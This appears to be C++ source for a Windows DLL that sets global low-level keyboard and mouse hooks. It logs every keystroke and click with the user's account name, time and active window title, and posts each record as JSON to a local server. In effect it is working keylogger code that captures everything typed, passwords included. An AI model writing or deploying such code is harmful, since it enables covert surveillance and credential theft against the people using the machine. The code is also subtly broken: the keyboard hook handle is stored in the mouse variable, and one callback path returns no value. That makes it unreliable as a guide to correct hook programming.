#include "dllhook.h"
#include "atltypes.h"
#include "cpr/cpr.h"
#include <tchar.h>
#include <ctime>
#include <string>
#include <nlohmann/json.hpp>
#include <Lmcons.h>

using namespace nlohmann;
using namespace std;
using namespace cpr;

HHOOK hMouseHook;
HHOOK hKeyboardHook;
HINSTANCE hInst;

EXPORT void CALLBACK SetMouseHook(void)
{
	hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInst, 0);
}

EXPORT void CALLBACK UnMouseHook(void)
{
	UnhookWindowsHookEx(hMouseHook);
}

EXPORT void CALLBACK SetKeyBoardHook(void)
{
	hMouseHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);
}

EXPORT void CALLBACK UnKeyBoardHook(void)
{
	UnhookWindowsHookEx(hKeyboardHook);
}

string now(const char* format = "%c")
{
	std::time_t t = std::time(0);
	char cstr[128];
	std::strftime(cstr, sizeof(cstr), format, std::localtime(&t));
	return string(cstr);
}

string account_name()
{
	wchar_t buffer[UNLEN + 1];
	DWORD len = UNLEN + 1;
	GetUserName(buffer, &len);
	char ch[UNLEN + 1];
	constexpr char def_char = ' ';
	WideCharToMultiByte(CP_ACP, 0, buffer, -1, ch, 260, &def_char, nullptr);
	return string(ch);
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
	{
		CallNextHookEx(hKeyboardHook, code, wParam, lParam);
		return 0;
	}
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

		HWND currentWindowHWND = GetForegroundWindow();
		char title[100];
		GetWindowTextA(currentWindowHWND, title, 100);

		json j;
		j["accountName"] = account_name();
		j["time"] = string(now("%I:%M:%S"));
		j["program"] = string(title);
		j["keyCode"] = std::to_string(p->vkCode);

		PostAsync(
			Url{ "https://localhost:7002/keyboard" },
			Body{ j.dump() },
			Header{ {"Content-Type", "application/json"} });

		return CallNextHookEx(nullptr, code, wParam, lParam);
	}
}

LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
	{
		CallNextHookEx(nullptr, code, wParam, lParam);
		return 0;
	}
	else
	{
		PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT)lParam;
		json j;
		HWND currentWindowHWND = GetForegroundWindow();
		char title[100];
		GetWindowTextA(currentWindowHWND, title, 100);

		if (wParam == WM_LBUTTONDOWN)
		{
			j["clickSide"] = "left";
		}
		else if (wParam == WM_RBUTTONDOWN)
		{
			j["clickSide"] = "right";
		}
		else
		{
			return CallNextHookEx(nullptr, code, wParam, lParam);
		}

		j["accountName"] = account_name();
		j["time"] = string(now("%I:%M:%S"));
		j["program"] = string(title);
		j["x"] = std::to_string(p->pt.x);
		j["y"] = std::to_string(p->pt.y);

		PostAsync(
			Url{ "https://localhost:7002/mouse" },
			Body{ j.dump() },
			Header{ {"Content-Type", "application/json"} });
	}
	return CallNextHookEx(nullptr, code, wParam, lParam);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	hInst = hinstDLL;
	return TRUE;
}
